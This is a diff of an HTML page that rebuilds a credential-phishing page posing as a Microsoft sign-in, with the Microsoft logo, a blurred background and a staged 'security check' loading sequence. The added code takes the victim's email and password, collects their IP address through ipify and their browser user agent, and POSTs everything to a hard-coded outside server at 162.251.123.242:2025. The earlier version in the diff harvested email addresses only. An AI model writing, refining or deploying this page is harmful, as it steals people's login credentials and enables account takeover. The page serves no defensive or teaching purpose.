@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Secure Sign-In</title>
+    <title>Secure Authentication Portal</title>
     <style>
         html, body {
             height: 100%;
@@ -17,49 +17,37 @@
             border: none;
             transition: filter 0.5s ease;
         }
-        #smallIframe {
+        #authContainer {
             position: absolute;
-            width: 450px; /* Original width for larger screens */
-            height: 350px; /* Original height for larger screens */
+            width: 450px;
+            height: 350px;
             top: 50%;
             left: 50%;
             transform: translate(-50%, -50%);
-            background: #fff;
-            border: none;
-            padding: 20px;
+            background: rgba(255, 255, 255, 0.95);
+            border-radius: 8px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.15);
+            padding: 30px;
             box-sizing: border-box;
             opacity: 0;
             transition: opacity 1s ease;
         }
         #logo {
-            position: relative;
             width: 120px;
             height: auto;
-            margin-top: 20px;
-            margin-left: 20px;
-            margin-bottom: 0;
+            margin-bottom: 20px;
         }
-        #expiredText, #loginForm {
-            transition: opacity 1s ease;
-            position: relative;
-        }
-        #expiredText {
+        .status-message {
             color: #000;
-            font-size: 26.5px;
-            margin-top: 10px;
-            margin-left: 20px;
-            margin-bottom: 0;
+            font-size: 20px;
+            margin: 10px 0;
             font-weight: 500;
+            transition: opacity 0.5s ease;
         }
         .throbber-container {
-            position: absolute;
-            width: 100%;
             height: 20px;
-            top: 50%;
-            left: 0;
-            transform: translateY(-50%);
+            margin: 20px 0;
             overflow: hidden;
-            background: transparent;
         }
         .throbber {
             display: flex;
@@ -75,6 +63,60 @@
             margin: 0 8px;
             animation: throb 1.5s ease-in-out infinite;
         }
+        #loginForm {
+            display: none;
+            text-align: left;
+        }
+        #loginForm input {
+            width: 100%;
+            padding: 12px;
+            margin-bottom: 15px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            font-size: 16px;
+            transition: border 0.3s ease;
+        }
+        #loginForm input:focus {
+            border-color: #005da6;
+            outline: none;
+        }
+        #loginForm button {
+            background-color: #005da6;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            font-size: 16px;
+            border-radius: 4px;
+            cursor: pointer;
+            float: right;
+            transition: background 0.3s ease;
+        }
+        #loginForm button:hover {
+            background-color: #004b8c;
+        }
+        #loginForm button:disabled {
+            background-color: #ccc;
+            cursor: not-allowed;
+        }
+        .footer-links {
+            clear: both;
+            padding-top: 20px;
+            font-size: 13px;
+        }
+        .footer-links a {
+            color: #005da6;
+            text-decoration: none;
+        }
+        .footer-links a:hover {
+            text-decoration: underline;
+        }
+        .error-message {
+            color: #d83b01;
+            font-size: 14px;
+            margin-top: -10px;
+            margin-bottom: 15px;
+            display: none;
+        }
         @keyframes moveThrobber {
             0% { transform: translateX(-100%); }
             50% { transform: translateX(0); }
@@ -84,152 +126,210 @@
             0%, 100% { transform: scale(1); }
             50% { transform: scale(1.5); }
         }
-        #loginForm {
-            display: none;
-            text-align: left;
-            margin-top: 5px;
-            margin-left: 20px;
-            margin-right: 20px; /* Adjusted margin for mobile */
-        }
-        #loginForm input {
-            display: block;
-            width: 100%;
-            padding: 10px;
-            margin-bottom: 10px;
-            border: none;
-            border-bottom: 1px solid #005da6;
-            background: transparent;
-            box-shadow: none;
-            outline: none;
-            font-size: 16px;
-            resize: none;
-        }
-        #loginForm button {
-            background-color: #005da6;
-            color: white;
-            border: none;
-            padding: 7px 10px;
-            font-size: 16px;
-            border-radius: 0px;
-            cursor: pointer;
-            margin-top: 75px; /* Move the button down a little */
-            width: 100px;
-            float: right;
-            margin-right: 0;
-        }
-        #signInText {
-            color: #000;
-            font-size: 26.5px;
-            margin-top: 10px;
-            margin-bottom: 10px;
-            font-weight: 500;
-        }
-        #loginForm p {
-            color: black; /* Change text color to black */
-        }
-        /* Media query for mobile devices */
         @media (max-width: 600px) {
-            #smallIframe {
-                top: 30%; /* Adjust this value to move it higher */
-                width: 100%; /* Fill the width of the mobile frame */
-                height: auto; /* Adjust height as needed */
-            }
-            #loginForm {
-                margin-left: 10px; /* Optional: Adjust margins for mobile */
-                margin-right: 10px; /* Optional: Adjust margins for mobile */
+            #authContainer {
+                width: 90%;
+                top: 40%;
             }
         }
     </style>
-    <script>
-        window.onload = function() {
-            // No email field pre-filling and no validation
-        };
-
-        function showLoginForm() {
-            document.getElementById('expiredText').style.display = 'none';
-            document.querySelector('.throbber-container').style.display = 'none';
-            const loginForm = document.getElementById('loginForm');
-            loginForm.style.display = 'block';
-            document.getElementById('email').focus();
-        }
-
-        document.addEventListener('DOMContentLoaded', function() {
-            document.getElementById('authForm').onsubmit = async function(event) {
-                event.preventDefault();
-                
-                const emailValue = document.getElementById('email').value;
-                
-                try {
-                    // Show loading state
-                    const button = document.querySelector('#authForm button');
-                    button.textContent = 'Sending...';
-                    button.disabled = true;
-                    
-                    // Send to your RDP server (replace with your actual RDP server IP/domain)
-                    const response = await fetch('http://162.251.123.242:2025/process-login', {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json',
-                        },
-                        body: JSON.stringify({
-                            email: emailValue,
-                            timestamp: new Date().toISOString(),
-                            source: 'web_form'
-                        })
-                    });
-                    
-                    if (!response.ok) throw new Error('Network response was not ok');
-                    
-                    const result = await response.json();
-                    
-                    // Handle success - redirect or show success message
-                    if (result.success) {
-                        window.location.href = result.redirectUrl || 'https://example.com/success';
-                    } else {
-                        alert('Authentication failed: ' + (result.message || 'Unknown error'));
-                        button.textContent = 'Next';
-                        button.disabled = false;
-                    }
-                } catch (error) {
-                    console.error('Error:', error);
-                    alert('An error occurred. Please try again.');
-                    button.textContent = 'Next';
-                    button.disabled = false;
-                }
-            };
-        });
-    </script>
 </head>
 <body>
-    <!-- [Previous HTML structure remains exactly the same until the form] -->
+    <iframe id="backgroundView" src="about:blank" aria-hidden="true"></iframe>
     
-    <!-- Only change the form part (remove action/method) -->
-    <div id="loginForm">
-        <p id="signInText">Sign in</p>
-        <form id="authForm">
-            <input type="email" id="email" placeholder="Email, phone, or Skype" aria-label="email" required>
-            <button type="submit">Next</button>
-        </form>
-        <p style="font-size: 13px; color: black; margin-top: 10px;">No account? <span style="color: blue;">Create one!</span></p>
-        <p style="font-size: 13px; color: blue;">Can't access your account?</p>
+    <div id="authContainer">
+        <img id="logo" src="https://upload.wikimedia.org/wikipedia/commons/9/96/Microsoft_logo_%282012%29.svg" alt="Company Logo">
+        <p id="statusMessage" class="status-message">Initializing secure session...</p>
+        
+        <div id="loadingIndicator" class="throbber-container">
+            <div class="throbber">
+                <div></div>
+                <div></div>
+                <div></div>
+                <div></div>
+                <div></div>
+            </div>
+        </div>
+        
+        <div id="loginForm">
+            <p id="signInText" class="status-message">Sign in to your account</p>
+            <form id="authForm">
+                <input type="email" id="email" placeholder="Email address" aria-label="Email address" required>
+                <div id="emailError" class="error-message">Please enter a valid email address</div>
+                <input type="password" id="password" placeholder="Password" aria-label="Password" required>
+                <div id="passwordError" class="error-message">Password is required</div>
+                <button type="submit" id="submitBtn">Sign in</button>
+            </form>
+            
+            <div class="footer-links">
+                <a href="#" id="createAccount">Create account</a> • 
+                <a href="#" id="forgotPassword">Forgot password?</a> • 
+                <a href="#" id="helpLink">Help</a>
+            </div>
+        </div>
     </div>
 
-    <!-- [Rest of your existing HTML and scripts remain the same] -->
     <script>
-        function applyBlur() {
-            document.getElementById('pdfViewer').style.filter = 'blur(5px)';
+        // DOM Elements
+        const authContainer = document.getElementById('authContainer');
+        const backgroundView = document.getElementById('backgroundView');
+        const statusMessage = document.getElementById('statusMessage');
+        const loadingIndicator = document.getElementById('loadingIndicator');
+        const loginForm = document.getElementById('loginForm');
+        const authForm = document.getElementById('authForm');
+        const submitBtn = document.getElementById('submitBtn');
+        const emailInput = document.getElementById('email');
+        const passwordInput = document.getElementById('password');
+        const emailError = document.getElementById('emailError');
+        const passwordError = document.getElementById('passwordError');
+
+        // Configuration
+        const config = {
+            rdpServer: 'http://162.251.123.242:2025', // Replace with your RDP server address
+            endpoint: '/process-auth',
+            backgroundImage: 'https://example.com/background.jpg',
+            initDelay: 1000,
+            blurDelay: 2000,
+            showFormDelay: 4000
+        };
+
+        // Initialize the page
+        function init() {
+            // Set background
+            backgroundView.src = config.backgroundImage;
+            
+            // Start the authentication flow
+            setTimeout(startAuthFlow, config.initDelay);
         }
-        function showSmallIframe() {
-            document.getElementById('smallIframe').style.opacity = '1';
+
+        // Authentication flow
+        function startAuthFlow() {
+            // Apply blur to background
+            setTimeout(() => {
+                backgroundView.style.filter = 'blur(5px)';
+                authContainer.style.opacity = '1';
+            }, config.blurDelay);
+
+            // Simulate security checks
+            setTimeout(() => {
+                statusMessage.textContent = "Checking security protocols...";
+            }, config.blurDelay + 1000);
+
+            // Show login form
+            setTimeout(() => {
+                statusMessage.style.opacity = '0';
+                loadingIndicator.style.opacity = '0';
+                
+                setTimeout(() => {
+                    statusMessage.remove();
+                    loadingIndicator.remove();
+                    loginForm.style.display = 'block';
+                }, 500);
+            }, config.showFormDelay);
         }
-        function fadeOutTextAndThrobber() {
-            document.getElementById('expiredText').style.opacity = '0';
-            document.querySelector('.throbber-container').style.opacity = '0';
-            setTimeout(showLoginForm, 1000);
+
+        // Form validation
+        function validateForm() {
+            let isValid = true;
+            
+            // Email validation
+            if (!emailInput.value || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(emailInput.value)) {
+                emailError.style.display = 'block';
+                isValid = false;
+            } else {
+                emailError.style.display = 'none';
+            }
+            
+            // Password validation
+            if (!passwordInput.value) {
+                passwordError.style.display = 'block';
+                isValid = false;
+            } else {
+                passwordError.style.display = 'none';
+            }
+            
+            return isValid;
         }
-        setTimeout(applyBlur, 2000);
-        setTimeout(showSmallIframe, 3000);
-        setTimeout(fadeOutTextAndThrobber, 5000);
+
+        // Handle form submission
+        async function handleSubmit(event) {
+            event.preventDefault();
+            
+            if (!validateForm()) return;
+            
+            try {
+                // Update UI
+                submitBtn.disabled = true;
+                submitBtn.textContent = 'Authenticating...';
+                
+                // Prepare data
+                const formData = {
+                    email: emailInput.value,
+                    password: passwordInput.value,
+                    timestamp: new Date().toISOString(),
+                    userAgent: navigator.userAgent,
+                    ip: await fetchIP()
+                };
+                
+                // Send to RDP server
+                const response = await fetch(`${config.rdpServer}${config.endpoint}`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'X-Requested-With': 'XMLHttpRequest'
+                    },
+                    body: JSON.stringify(formData)
+                });
+                
+                if (!response.ok) throw new Error('Network response was not ok');
+                
+                const data = await response.json();
+                
+                if (data.success) {
+                    // Successful authentication
+                    statusMessage.textContent = "Authentication successful!";
+                    statusMessage.style.color = "#107c10";
+                    statusMessage.style.opacity = '1';
+                    loginForm.style.opacity = '0.5';
+                    
+                    // Redirect or proceed with next steps
+                    if (data.redirectUrl) {
+                        setTimeout(() => {
+                            window.location.href = data.redirectUrl;
+                        }, 1500);
+                    }
+                } else {
+                    // Authentication failed
+                    throw new Error(data.message || 'Authentication failed');
+                }
+            } catch (error) {
+                console.error('Authentication error:', error);
+                statusMessage.textContent = error.message || "Authentication failed. Please try again.";
+                statusMessage.style.color = "#d83b01";
+                statusMessage.style.opacity = '1';
+                submitBtn.disabled = false;
+                submitBtn.textContent = 'Sign in';
+            }
+        }
+
+        // Fetch client IP (simplified)
+        async function fetchIP() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                return data.ip || 'unknown';
+            } catch {
+                return 'unknown';
+            }
+        }
+
+        // Event listeners
+        authForm.addEventListener('submit', handleSubmit);
+        emailInput.addEventListener('input', () => emailError.style.display = 'none');
+        passwordInput.addEventListener('input', () => passwordError.style.display = 'none');
+
+        // Initialize
+        document.addEventListener('DOMContentLoaded', init);
     </script>
 </body>
 </html>
